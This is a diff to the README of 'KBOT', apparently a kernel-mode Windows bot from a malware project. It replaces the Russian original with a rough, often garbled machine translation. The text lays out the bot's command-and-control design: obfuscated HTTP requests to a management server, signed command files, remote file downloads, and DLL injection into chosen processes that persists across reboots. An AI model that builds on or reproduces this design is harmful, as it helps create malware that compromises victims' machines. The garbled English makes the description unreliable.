@@ -1,50 +1,46 @@
 KBOT - NT-kernel bot program
 ----------------------------
-
-Программа предназначена для скачивания, посредством HTTP, файлов, сохрания их на VFS и 
- регистрации в модуле KLDR для инжекта в заданные процессы.
+The program is designed to download through HTTP, files, save them to the VFS and registration module KLDR for injection produce in a given process.
  
-Поддерживаемые ОС: XP - WIN7.
-Поддерживаемые архитектуры: x86, AMD64(EM64T).
+Supported OS: XP - WIN7.
+Supported Architectures: x86, AMD64 (EM64T).
 
-Проект cобирается в статически подключаемую библиотеку(LIB), которая линкуется к драйверу.
+Project statically link library (LIB), which links to the driver.
 
-При первом запуске программа генерирует 16-битный ID пользователя и сохраняет его на VFS в файл \USER.ID
-В дальнейшем ID пользователя не изменяется и передается каждый раз при запросе к серверу управления.
+When you first start the program generates a 16-bit user ID and saves it to a file on the VFS \ USER.ID
+In the future, the user ID is not changed and is transmitted every time a request to the management server.
 
-Программа осуществляет два типа HTTP запросов к серверу управления:
-- запрос кофиг-файла;
-- запрос файла команд;
+The program provides two types of HTTP requests to the management server:
+- Request configuration file;
+- File request command;
 
-Программа поддерживает обфускацию HTTP запросов.
-Для этого строка каждого запроса шифруется с помощью алгоритма RC6 и переводится в формат BASE64.
+The program supports the obfuscation of HTTP requests .
+For this line of each request is encrypted using an algorithm RC6 and translated into a format BASE64.
 
-Программа поддерживает проверку цифровой подписи и шифрование конфиг-файлов и файлов команд.
-Для этого к драйверу прикрепляется файл public.key, содержащий открытый RSA-ключ.
-С помощью этого ключа осуществляется расшифровка и проверка подписи полученного файла.
-Если файл не проходит проверку, то он игнорируется.
+The program supports validation of digital signatures and encryption of configuration files and command files .
+To do this, the driver attachments public.key, containing the public RSA- key.
+With this key decryption is performed and the signature verification of the resulting file .
+If the file is not tested , it is ignored.
 
+configuration file
 
-Файл конфигурации
+The program works on the basis of the prescribed settings in the configuration file ( configuration file) .
+Config file may be stored on VFS, or may be attached directly to the driver .
+When you run the program first looks for a file in the VFS, and if it is not - use the attached configuration file.
+Example of config file with the description : \ BkBuild \ kbot.ini
+When a new configuration file , it is saved in a file on the VFS \ KBOT.INI existing KBOT.INI replaced .
+File commands
 
-Программа работает на основе настроек прописанных в файле конфигурации (конфиг-файл).
-Конфиг-файл может храниться на VFS, либо может быть прикреплен непосредственно к драйверу.
-При запуске программы сначала ищется файл на VFS, и если его нет - используется прикрепленный конфиг-файл.
-Пример конфиг-файла с описанием: \BkBuild\kbot.ini
-При получение нового конфиг-файла он сохраняется на VFS в файл \KBOT.INI Существующий KBOT.INI заменяется.
+A text file containing one or more of the following commands:
 
+LOAD_FILE <HTTP link> [filename on VFS] - downloads a file from the link given in the VFS and stores with the given name
 
-Файл команд
+DELETE_FILE <file name on the VFS> - removes the file specified with VFS
 
-Текстовый файл содержащий одну или несколько из следующих команд:
+SET_INJECT <file name on the VFS> <list of processes> - sets inject the specified file (usually DLL) in
+specified in the list of processes. All set Inject apply immediately and are saved
+file \ INJECTS.SYS at VFS, so as to be active after restarting the OS.
+To remove inject use the command "SET_INJECT <file name on the VFS>" without a list of processes.
 
-	LOAD_FILE <HTTP ссылка> [имя файла на VFS]	- скачивает файл по заданной ссылке и сохраняет на VFS с заданным именем 
-	
-	DELETE_FILE	<имя файла на VFS>				- удаляет указанный файл с VFS
-	
-	SET_INJECT <имя файла на VFS> <список процессов> - задает инжект указанного файла (как правило DLL) в
-		указанные в списке процессы. Все заданные инжекты применяются немедленно и сохраняются 
-		в файле \INJECTS.SYS на VFS, так, чтобы быть активными после перезагрузки ОС.
-		Чтобы удалить инжект используется команда "SET_INJECT <имя файла на VFS>" без списка процессов.
-		
- Имена команд чувствительны к регистру, параметры - нет.
+ Command names are case-sensitive parameters - no.
+ 
